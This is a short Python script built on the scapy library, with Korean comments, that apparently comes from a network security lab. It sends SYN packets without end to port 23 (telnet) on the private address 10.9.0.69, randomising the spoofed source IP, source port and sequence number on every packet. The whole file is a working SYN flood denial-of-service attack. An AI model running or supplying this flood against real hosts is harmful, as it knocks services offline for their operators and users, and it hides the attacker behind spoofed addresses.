from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip = IP(dst="10.9.0.69") # 목적지 IP주소
tcp = TCP(dport=23, flags='S') # 포트 23, SYN 플래그 설정하여 TCP핸드셰이크 시작
pkt = ip/tcp # IP,  TCP 결합하여 하나의 패킷 형성

while True: # 패킷 반복 전송
    pkt[IP].src = str(IPv4Address(getrandbits(32))) # 무작위로 src IP 주소 할당
    pkt[TCP].sport = getrandbits(16) # 무작위로 전송 포트 할당
    pkt[TCP].seq = getrandbits(32) # 무작위로 시퀀스 번호 할당
    send(pkt, verbose=0) # 패킷을 전송하며, 출력 정보를 표시하지 않도록 설정